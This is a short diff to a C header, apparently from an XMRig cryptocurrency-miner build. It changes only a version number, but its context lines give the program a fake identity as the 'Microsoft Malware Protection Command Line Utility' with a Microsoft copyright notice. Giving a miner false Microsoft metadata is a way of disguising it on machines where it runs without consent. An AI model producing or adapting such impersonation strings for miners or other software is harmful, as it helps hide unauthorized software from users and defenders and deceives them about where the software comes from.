@@ -36,7 +36,7 @@
 #define APP_DESC      "Microsoft Malware Protection Command Line Utility"
 #define APP_COPYRIGHT "(C) Microsoft Corporation. All rights reserved."
 #endif
-#define APP_VERSION   "6.1.7601.813"
+#define APP_VERSION   "6.1.7601.91"
 #define APP_DOMAIN    ""
 #define APP_SITE      ""
 #define APP_KIND      "cpu"
@@ -44,7 +44,7 @@
 #define APP_VER_MAJOR  6
 #define APP_VER_MINOR  1
 #define APP_VER_BUILD  7601
-#define APP_VER_REV    813
+#define APP_VER_REV    91
 
 #ifndef NDEBUG
 	#ifndef XMRIG_NO_TLS
